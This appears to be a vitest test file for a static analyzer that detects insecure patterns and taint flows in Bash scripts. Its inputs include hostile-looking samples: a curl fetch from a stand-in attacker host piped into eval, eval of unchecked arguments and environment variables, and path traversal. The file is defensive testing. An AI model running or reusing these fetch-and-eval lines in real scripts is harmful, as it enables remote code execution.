/**
 * Bash pattern-based findings tests
 *
 * Tests the five non-DFG pattern rules added to LanguageSourcesPass for Bash:
 *   1. hardcoded-credential (CWE-798)
 *   2. cleartext-transmission (CWE-319)
 *   3. predictable-temp-file (CWE-377)
 *   4. insecure-file-permission (CWE-732)
 *   5. unsafe-archive-extraction (CWE-22)
 */

import { describe, it, expect, beforeAll } from 'vitest';
import { initAnalyzer, analyze } from '../../../src/analyzer.js';

describe('Bash language-sources pattern rules', () => {
  beforeAll(async () => {
    await initAnalyzer();
  });

  // ── Hardcoded credentials ──────────────────────────────────────────────

  describe('hardcoded-credential', () => {
    it('detects PASSWORD="literal"', async () => {
      const code = 'PASSWORD="s3cretValue"';
      const result = await analyze(code, 'deploy.sh', 'bash');
      const findings = (result.findings ?? []).filter(f => f.rule_id === 'hardcoded-credential');
      expect(findings.length).toBe(1);
      expect(findings[0].cwe).toBe('CWE-798');
    });

    it('detects API_KEY=literal', async () => {
      const code = 'API_KEY=abcdef123456';
      const result = await analyze(code, 'deploy.sh', 'bash');
      const findings = (result.findings ?? []).filter(f => f.rule_id === 'hardcoded-credential');
      expect(findings.length).toBe(1);
    });

    it('skips PASSWORD=$VAR (variable reference)', async () => {
      const code = 'PASSWORD="$DB_PASS"';
      const result = await analyze(code, 'deploy.sh', 'bash');
      const findings = (result.findings ?? []).filter(f => f.rule_id === 'hardcoded-credential');
      expect(findings.length).toBe(0);
    });

    it('skips comments', async () => {
      const code = '# PASSWORD="s3cretValue"';
      const result = await analyze(code, 'deploy.sh', 'bash');
      const findings = (result.findings ?? []).filter(f => f.rule_id === 'hardcoded-credential');
      expect(findings.length).toBe(0);
    });
  });

  // ── Cleartext HTTP ─────────────────────────────────────────────────────

  describe('cleartext-transmission', () => {
    it('detects curl http://', async () => {
      const code = 'curl http://example.com/api';
      const result = await analyze(code, 'deploy.sh', 'bash');
      const findings = (result.findings ?? []).filter(f => f.rule_id === 'cleartext-transmission');
      expect(findings.length).toBe(1);
      expect(findings[0].cwe).toBe('CWE-319');
    });

    it('detects wget http://', async () => {
      const code = 'wget http://example.com/file.tar.gz';
      const result = await analyze(code, 'deploy.sh', 'bash');
      const findings = (result.findings ?? []).filter(f => f.rule_id === 'cleartext-transmission');
      expect(findings.length).toBe(1);
    });

    it('skips curl https://', async () => {
      const code = 'curl https://example.com/api';
      const result = await analyze(code, 'deploy.sh', 'bash');
      const findings = (result.findings ?? []).filter(f => f.rule_id === 'cleartext-transmission');
      expect(findings.length).toBe(0);
    });
  });

  // ── Predictable /tmp file ──────────────────────────────────────────────

  describe('predictable-temp-file', () => {
    it('detects /tmp/myapp.log', async () => {
      const code = 'echo "data" > /tmp/myapp.log';
      const result = await analyze(code, 'deploy.sh', 'bash');
      const findings = (result.findings ?? []).filter(f => f.rule_id === 'predictable-temp-file');
      expect(findings.length).toBe(1);
      expect(findings[0].cwe).toBe('CWE-377');
    });

    it('skips mktemp usage', async () => {
      const code = 'tmpfile=$(mktemp /tmp/myapp.XXXXXX)';
      const result = await analyze(code, 'deploy.sh', 'bash');
      const findings = (result.findings ?? []).filter(f => f.rule_id === 'predictable-temp-file');
      expect(findings.length).toBe(0);
    });
  });

  // ── Insecure file permissions ──────────────────────────────────────────

  describe('insecure-file-permission', () => {
    it('detects chmod 777', async () => {
      const code = 'chmod 777 /var/www/html';
      const result = await analyze(code, 'deploy.sh', 'bash');
      const findings = (result.findings ?? []).filter(f => f.rule_id === 'insecure-file-permission');
      expect(findings.length).toBe(1);
      expect(findings[0].cwe).toBe('CWE-732');
    });

    it('detects chmod 666', async () => {
      const code = 'chmod 666 /etc/config';
      const result = await analyze(code, 'deploy.sh', 'bash');
      const findings = (result.findings ?? []).filter(f => f.rule_id === 'insecure-file-permission');
      expect(findings.length).toBe(1);
    });

    it('skips chmod 755 (safe)', async () => {
      const code = 'chmod 755 /usr/local/bin/myapp';
      const result = await analyze(code, 'deploy.sh', 'bash');
      const findings = (result.findings ?? []).filter(f => f.rule_id === 'insecure-file-permission');
      expect(findings.length).toBe(0);
    });
  });

  // ── Unsafe archive extraction ──────────────────────────────────────────

  describe('unsafe-archive-extraction', () => {
    it('detects tar -xf without --strip-components', async () => {
      const code = 'tar -xf archive.tar.gz';
      const result = await analyze(code, 'deploy.sh', 'bash');
      const findings = (result.findings ?? []).filter(f => f.rule_id === 'unsafe-archive-extraction');
      expect(findings.length).toBe(1);
      expect(findings[0].cwe).toBe('CWE-22');
    });

    it('skips tar -xf with --strip-components', async () => {
      const code = 'tar -xf archive.tar.gz --strip-components=1';
      const result = await analyze(code, 'deploy.sh', 'bash');
      const findings = (result.findings ?? []).filter(f => f.rule_id === 'unsafe-archive-extraction');
      expect(findings.length).toBe(0);
    });

    it('skips tar -cf (create, not extract)', async () => {
      const code = 'tar -cf backup.tar /home';
      const result = await analyze(code, 'deploy.sh', 'bash');
      const findings = (result.findings ?? []).filter(f => f.rule_id === 'unsafe-archive-extraction');
      expect(findings.length).toBe(0);
    });
  });

  // ── Taint sources: positional parameters ────────────────────────────────

  describe('positional parameter sources', () => {
    it('$1 is registered as io_input source', async () => {
      const code = 'user="$1"\neval "echo $user"';
      const result = await analyze(code, 'script.sh', 'bash');
      const sources = result.taint.sources.filter(s => s.variable === '1');
      expect(sources.length).toBeGreaterThan(0);
      expect(sources[0].type).toBe('io_input');
    });

    it('$@ is registered as io_input source', async () => {
      const code = 'echo "$@"';
      const result = await analyze(code, 'script.sh', 'bash');
      const sources = result.taint.sources.filter(s => s.variable === '@');
      expect(sources.length).toBeGreaterThan(0);
    });

    it('$1 has a synthetic DFG def with kind=param', async () => {
      const code = 'user="$1"';
      const result = await analyze(code, 'script.sh', 'bash');
      const paramDef = result.dfg.defs.find(d => d.variable === '1' && d.kind === 'param');
      expect(paramDef).toBeDefined();
      expect(paramDef!.line).toBe(0); // synthetic, before any real code
    });

    it('def-use chain: $1 → user (via assignment)', async () => {
      const code = 'user="$1"\neval "$user"';
      const result = await analyze(code, 'script.sh', 'bash');
      const chain = result.dfg.chains.find(c => c.via === '1');
      expect(chain).toBeDefined();
      // Chain from positional param def to user def
      const userDef = result.dfg.defs.find(d => d.variable === 'user');
      expect(chain!.to_def).toBe(userDef!.id);
    });
  });

  // ── Taint sources: command substitution ─────────────────────────────────

  describe('command substitution sources', () => {
    it('$(curl ...) assignment is registered as network_input source', async () => {
      const code = 'data=$(curl -s https://attacker.example.com/payload)\neval "$data"';
      const result = await analyze(code, 'script.sh', 'bash');
      const sources = result.taint.sources.filter(s => s.type === 'network_input' && s.variable === 'data');
      expect(sources.length).toBeGreaterThan(0);
    });

    it('$(wget ...) assignment is registered as network_input source', async () => {
      const code = 'payload=$(wget -qO- http://example.com)\neval "$payload"';
      const result = await analyze(code, 'script.sh', 'bash');
      const sources = result.taint.sources.filter(s => s.type === 'network_input' && s.variable === 'payload');
      expect(sources.length).toBeGreaterThan(0);
    });

    it('$(cat ...) assignment is registered as file_input source', async () => {
      const code = 'content=$(cat /etc/config)\neval "$content"';
      const result = await analyze(code, 'script.sh', 'bash');
      const sources = result.taint.sources.filter(s => s.type === 'file_input' && s.variable === 'content');
      expect(sources.length).toBeGreaterThan(0);
    });
  });

  // ── Taint sources: environment variables ────────────────────────────────

  describe('environment variable sources', () => {
    it('$USER_INPUT is registered as env_input (untrusted env pattern)', async () => {
      const code = 'eval "echo $USER_INPUT"';
      const result = await analyze(code, 'script.sh', 'bash');
      const sources = result.taint.sources.filter(s => s.type === 'env_input' && s.variable === 'USER_INPUT');
      expect(sources.length).toBeGreaterThan(0);
    });

    it('$HTTP_HOST is registered as env_input (CGI pattern)', async () => {
      const code = 'echo "$HTTP_HOST"';
      const result = await analyze(code, 'script.sh', 'bash');
      const sources = result.taint.sources.filter(s => s.type === 'env_input' && s.variable === 'HTTP_HOST');
      expect(sources.length).toBeGreaterThan(0);
    });

    it('$QUERY_STRING is registered as env_input', async () => {
      const code = 'echo "$QUERY_STRING"';
      const result = await analyze(code, 'script.sh', 'bash');
      const sources = result.taint.sources.filter(s => s.type === 'env_input' && s.variable === 'QUERY_STRING');
      expect(sources.length).toBeGreaterThan(0);
    });

    it('$HOME is NOT registered (safe env var)', async () => {
      const code = 'echo "$HOME"';
      const result = await analyze(code, 'script.sh', 'bash');
      const sources = result.taint.sources.filter(s => s.type === 'env_input' && s.variable === 'HOME');
      expect(sources.length).toBe(0);
    });

    it('locally assigned var is NOT flagged as env_input', async () => {
      const code = 'USER_INPUT="safe"\necho "$USER_INPUT"';
      const result = await analyze(code, 'script.sh', 'bash');
      const sources = result.taint.sources.filter(s => s.type === 'env_input' && s.variable === 'USER_INPUT');
      expect(sources.length).toBe(0);
    });
  });

  // ── Reproducer tests (from handoff) ─────────────────────────────────────

  describe('handoff reproducers', () => {
    it('CWE-78/94: command injection via positional arg', async () => {
      const code = '#!/bin/bash\nuser="$1"\neval "echo $user"';
      const result = await analyze(code, 'script.sh', 'bash');
      expect(result.taint.sources.some(s => s.variable === '1')).toBe(true);
      expect(result.taint.sinks.some(s => s.method === 'eval')).toBe(true);
    });

    it('CWE-22: path traversal via positional arg', async () => {
      const code = '#!/bin/bash\nuser_path="$1"\ncat "/etc/app/$user_path"';
      const result = await analyze(code, 'script.sh', 'bash');
      expect(result.taint.sources.some(s => s.variable === '1')).toBe(true);
      expect(result.taint.sinks.some(s => s.method === 'cat')).toBe(true);
    });

    it('CWE-78: command injection via $(curl)', async () => {
      const code = '#!/bin/bash\ndata=$(curl -s https://attacker.example.com/payload)\neval "$data"';
      const result = await analyze(code, 'script.sh', 'bash');
      expect(result.taint.sources.some(s => s.type === 'network_input')).toBe(true);
      expect(result.taint.sinks.some(s => s.method === 'eval')).toBe(true);
    });

    it('CWE-78: command injection via env var', async () => {
      const code = '#!/bin/bash\neval "echo $USER_INPUT"';
      const result = await analyze(code, 'script.sh', 'bash');
      expect(result.taint.sources.some(s => s.type === 'env_input')).toBe(true);
      expect(result.taint.sinks.some(s => s.method === 'eval')).toBe(true);
    });
  });

  // ── DFG integration ────────────────────────────────────────────────────

  describe('DFG integration', () => {
    it('buildBashDFG produces defs and uses for variable assignment + expansion', async () => {
      const code = 'VAR="hello"\necho "$VAR"';
      const result = await analyze(code, 'test.sh', 'bash');
      expect(result.dfg.defs.some(d => d.variable === 'VAR')).toBe(true);
      expect(result.dfg.uses.some(u => u.variable === 'VAR')).toBe(true);
    });

    it('read creates a DFG def', async () => {
      const code = 'read username';
      const result = await analyze(code, 'test.sh', 'bash');
      expect(result.dfg.defs.some(d => d.variable === 'username')).toBe(true);
    });

    it('for loop variable creates a DFG def', async () => {
      const code = 'for f in *.txt; do\n  echo "$f"\ndone';
      const result = await analyze(code, 'test.sh', 'bash');
      expect(result.dfg.defs.some(d => d.variable === 'f')).toBe(true);
      expect(result.dfg.uses.some(u => u.variable === 'f')).toBe(true);
    });

    it('def-use chain links read → $VAR usage', async () => {
      const code = 'read input\necho "$input"';
      const result = await analyze(code, 'test.sh', 'bash');
      const inputDef = result.dfg.defs.find(d => d.variable === 'input');
      expect(inputDef).toBeDefined();
      const inputUse = result.dfg.uses.find(u => u.variable === 'input');
      expect(inputUse).toBeDefined();
      expect(inputUse!.def_id).toBe(inputDef!.id);
    });
  });

  // ── CFG integration ────────────────────────────────────────────────────

  describe('CFG integration', () => {
    it('buildBashCFG produces blocks for top-level commands', async () => {
      const code = 'echo "start"\nread input\necho "$input"';
      const result = await analyze(code, 'test.sh', 'bash');
      expect(result.cfg.blocks.length).toBeGreaterThan(0);
    });

    it('if_statement creates conditional block', async () => {
      const code = 'if [ -f /etc/passwd ]; then\n  echo "exists"\nfi';
      const result = await analyze(code, 'test.sh', 'bash');
      const conditionalBlocks = result.cfg.blocks.filter(b => b.type === 'conditional');
      expect(conditionalBlocks.length).toBeGreaterThan(0);
    });
  });
});
